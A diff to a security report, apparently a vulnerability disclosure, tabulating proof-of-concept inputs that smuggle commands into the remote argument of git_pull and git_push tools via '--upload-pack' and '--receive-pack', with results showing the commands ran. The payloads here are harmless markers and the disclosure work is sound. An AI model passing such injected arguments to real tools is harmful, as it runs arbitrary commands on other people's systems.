@@ -22,7 +22,7 @@ schemas documented in REPORT.md §2.
 | # | Tool | Arguments | Observed result |
 |---|---|---|---|
 | 1 | `git_pull` | `remote: "--upload-pack=id > /tmp/RCE_PROOF1"` | git stderr: `id: /tmp/rce_test_repo: no such user` — **`id` was executed**; redirect ran; marker file created |
-| 2 | `git_pull` | `remote: "--upload-pack=sh -c 'echo RCE_$(id -u)@$(hostname) > /tmp/RCE_PROOF2'"` | `/tmp/RCE_PROOF2` created with content `RCE_501@<redacted>.local` — **shell substitution executed as uid 501** |
+| 2 | `git_pull` | `remote: "--upload-pack=sh -c 'echo RCE_$(id -u)@$(hostname) > /tmp/RCE_PROOF2'"` | `/tmp/RCE_PROOF2` created with content `RCE_<uid>@<redacted>.local` — **shell substitution executed with the logged-in user's uid** |
 | 3 | `git_push` | `remote: "--receive-pack=touch /tmp/RCE_PROOF3"`, `branch: "master"` | `/tmp/RCE_PROOF3` created — **receive-pack variant executes** |
 
 Raw server responses (typical):
